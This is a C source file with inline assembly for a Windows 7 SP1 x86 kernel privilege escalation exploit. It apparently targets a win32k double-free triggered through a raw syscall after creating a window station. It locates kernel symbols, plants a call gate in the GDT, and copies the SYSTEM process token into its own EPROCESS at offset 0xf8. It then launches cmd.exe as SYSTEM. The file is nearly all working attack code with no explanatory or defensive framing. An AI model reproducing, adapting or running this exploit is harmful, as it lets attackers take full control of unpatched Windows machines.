#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>
#include <process.h>
#include <winuser.h>
#include "double_free.h"



// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID


#pragma comment(lib,"User32.lib")


typedef struct _FARCALL {
	DWORD Offset;
	WORD SegSelector;
} FARCALL, *PFARCALL;


FARCALL Farcall = { 0 };


LONG Sequence = 1;
LONG Actual[3];

_NtQuerySystemInformation NtQuerySystemInformation;
LPCSTR lpPsInitialSystemProcess = "PsInitialSystemProcess";
LPCSTR lpPsReferencePrimaryToken = "PsReferencePrimaryToken";
FARPROC fpPsInitialSystemProcess = NULL;
FARPROC fpPsReferencePrimaryToken = NULL;
NtAllocateVirtualMemory_t  NtAllocateVirtualMemory;



void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}



FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;




	NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	lpKernelName = (LPCSTR)ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}


LONG WINAPI
VectoredHandler1(
struct _EXCEPTION_POINTERS *ExceptionInfo
	)
{

	HMODULE v2;

	if (ExceptionInfo->ExceptionRecord->ExceptionCode == 0xE06D7363)
		return 1;

	v2 = GetModuleHandleA("kernel32.dll");
	ExceptionInfo->ContextRecord->Eip = (DWORD)GetProcAddress(v2, "ExitThread");

	return EXCEPTION_CONTINUE_EXECUTION;
}



DWORD FindAddressByHandle( HANDLE hCurProcess )
{
	PSYSTEM_HANDLE_INFORMATION pSysHandleInformation = new SYSTEM_HANDLE_INFORMATION;
	DWORD size = 0xfff00;
	DWORD needed = 0;
	DWORD dwPid = 0;
	NTSTATUS status;

	
	pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(size);
	memset(pSysHandleInformation, 0, size);
	status = NtQuerySystemInformation(SystemHandleInformation, pSysHandleInformation, size, &needed);

// 	pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)new BYTE[needed];
// 	status = NtQuerySystemInformation(SystemHandleInformation, pSysHandleInformation, needed, 0);

// 	if (!status)
// 	{
// 		if (0 == needed)
// 		{
// 			return -1;// some other error
// 		}
// 		// The previously supplied buffer wasn't enough.
// 		delete pSysHandleInformation;
// 		size = needed + 1024;
// 		
// 		if (!status)
// 		{
// 			// some other error so quit.
// 			delete pSysHandleInformation;
// 			return -1;
// 		}
// 	}

	dwPid = GetCurrentProcessId();
	
	for (DWORD i = 0; i < pSysHandleInformation->dwCount; i++)
	{
		SYSTEM_HANDLE& sh = pSysHandleInformation->Handles[i];

		if (sh.dwProcessId == dwPid && (DWORD)hCurProcess == (DWORD)sh.wValue)
		{
			return (DWORD)(sh.pAddress);
		}

	}

	return -1;

}


HANDLE hDesHandle = NULL;
DWORD dwCurAddress;
PACCESS_TOKEN pToken;
DWORD  *v1;
DWORD v2, *p2;
DWORD i;
PVOID  Memory = NULL;
DWORD ori_ret = 0;

void __declspec(naked) EscapeOfPrivilege(HANDLE hCurProcess)
{


	__asm
	{
		push ebp
		mov ebp,esp
	}

	//v1 = (DWORD *)&hCurProcess;
	if (DuplicateHandle(hCurProcess, hCurProcess, hCurProcess, &hDesHandle, 0x10000000u, 0, 2u))
	{
		dwCurAddress = FindAddressByHandle(hDesHandle);

		if ( dwCurAddress == -1 )
		{
			printf("Find Current Process address Failed!\n");
			system("pause");
			//exit(-1);
		}

		printf("addrProcess:0x%08x\n", dwCurAddress);


		v1 = (DWORD *)dwCurAddress;
		
		__asm{
				push ecx; save context
				lea  ecx, Farcall
				call fword ptr[ecx]
				mov eax, [esp]
				mov [ebp-0x2c], eax
				add esp,4

		}

		p2 = &v2;
		p2 = *(DWORD**)fpPsInitialSystemProcess;
		pToken = ((PsReferencePrimaryToken_t)fpPsReferencePrimaryToken)(p2);


//
		//// walk through token offset
// 		if ((*p2 & 0xFFFFFFF8) != (unsigned long)pToken)
// 		{
// 			do
// 			{
// 				i = p2[1];
// 				++p2;
// 				++v1;
// 			} while ((i & 0xFFFFFFF8) != (unsigned long)pToken);
// 		}



		Memory = (PVOID)(ULONG)((char*)dwCurAddress + 0xf8);
		*(PULONG)Memory = *(PULONG)((char*)p2 + 0xf8);

		__asm
		{
			mov eax, [ebp-0x2c]
			push eax
			mov eax, PopShell
			push eax
			retf
		}
	}

}




int fill_callgate(int a1, int a2, int a3)
{
	int *v3; // edx
	int v4; // ecx
	signed int v5; // esi

	v3 = (int *)(a1 + 4);
	v4 = a2 + 352;
	v5 = 87;
	do
	{
		*v3 = v4;
		v4 += 8;
		v3 += 2;
		--v5;
	} while (v5);
	if (!a3)
	{
		*(DWORD *)(a1 + 96) = 0xC3;  // ret
		*(WORD *)(a1 + 76) = a2 + 0x1B4;  // address low offset
		*(WORD *)(a1 + 82) = (unsigned int)(a2 + 0x1B4) >> 16;  // address high offset
		*(WORD *)(a1 + 78) = 0x1A8;  // segment selector
		*(WORD *)(a1 + 80) = 0xEC00u;
		*(WORD *)(a1 + 84) = 0xFFFFu;
		*(WORD *)(a1 + 86) = 0;
		*(BYTE *)(a1 + 88) = 0;
		*(BYTE *)(a1 + 91) = 0;
		*(BYTE *)(a1 + 89) = 0x9Au;
		*(BYTE *)(a1 + 90) = 0xCFu;
	}
	return 1;
}




void main()
{

	NTSTATUS ntStatus;
	PVOID pMappedAddress = NULL;
	SIZE_T SectionSize = 0x4000;
	DWORD_PTR dwArg1;
	DWORD dwArg2;
	PVOID pMappedAddress1 = NULL;
	
	RtlAdjustPrivilege_t  RtlAdjustPrivilege;

	DWORD dwPageSize = 0;
	char szGDT[6];
	struct _SYSTEM_INFO SystemInfo;
	HANDLE hCurThread = NULL, hCurProcess = NULL;
	HMODULE hNtdll = NULL;
	PVOID dwAllocMem = (PVOID)0x100;
	PVOID pAllocMem;
	HWINSTA hWndstation;
	DWORD temp;


	fpPsInitialSystemProcess = KernelSymbolInfo(lpPsInitialSystemProcess);
	fpPsReferencePrimaryToken = KernelSymbolInfo(lpPsReferencePrimaryToken);

	if ( fpPsInitialSystemProcess  && fpPsReferencePrimaryToken )
	{
		AddVectoredExceptionHandler(1u, VectoredHandler1);

		hCurThread = GetCurrentThread();
		dwArg1 = SetThreadAffinityMask(hCurThread, 1u);
		printf("thread prev mask : 0x % 08x\n", dwArg1);

		__asm 
		{
			sgdt szGDT; 
		}

		temp = *(int*)(szGDT + 2);
		printf("addrGdt:%#p\n", *(int*)(szGDT + 2));

		GetSystemInfo(&SystemInfo);
		dwPageSize = SystemInfo.dwPageSize;

		hNtdll = GetModuleHandle("ntdll.dll");
		NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
		if (!NtAllocateVirtualMemory) {
			printf("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
			system("pause");
			//exit(-1);
		}


		RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		if (!NtAllocateVirtualMemory) {
			printf("\t\t[-] Failed Resolving RtlAdjustPrivilege: 0x%X\n", GetLastError());
			system("pause");
			//exit(-1);
		}


		hCurProcess = GetCurrentProcess();
		ntStatus = NtAllocateVirtualMemory(hCurProcess, &dwAllocMem, 0, (PULONG)&dwPageSize, 0x3000, 4);


		if (ntStatus)
		{
			
			printf("Alloc mem Failed! Error Code: 0x%08x!\n", ntStatus);
			system("pause");
			//exit(-1);
		}

		pAllocMem = operator new(0x400);
		memset(pAllocMem, 0, 0x400u);
		
		*(DWORD *)(*(DWORD*)dwAllocMem + 0x14)= *(DWORD*)pAllocMem;
		*(DWORD *)(*(DWORD*)dwAllocMem + 0x2C) = temp+0x154;

		fill_callgate((int)pAllocMem, temp, 0);

		//*(DWORD *)(v22 + 20) = *(DWORD*)pAllocMem;
		//*(DWORD *)(v22 + 44) = v22[1] + 340;

		printf("ready to trigger!\n");

		hWndstation = CreateWindowStationW(0, 0, 0x80000000, 0);

		if ( hWndstation )
		{
			if (SetProcessWindowStation(hWndstation))
			{
				__asm {
				    //int     3
					push    esi
					mov     esi, pAllocMem
					push    eax
					push    edx
					push    esi
					push    esi
					mov     eax,0x1226
					mov     edx, 7FFE0300h
					call    dword ptr[edx]
					pop esi
					pop esi
					pop edx
					pop eax
					pop esi
				}

				Farcall.SegSelector = 0x1a0;

				EscapeOfPrivilege( hCurProcess );


				PopShell();
				
			}
			else
			{
				int n = GetLastError();
				printf("step2 failed:0x%08x\n", n);
				system("pause");
				//exit(-1);
			}

		}
		else
		{
			int n = GetLastError();
			printf("step1 failed:0x%08x\n", n);
			system("pause");
			//exit(-1);
		}

	}
	else
	{
		printf("Init Symbols Failed! \n");
		system("pause");
		//exit(-1);
	}

}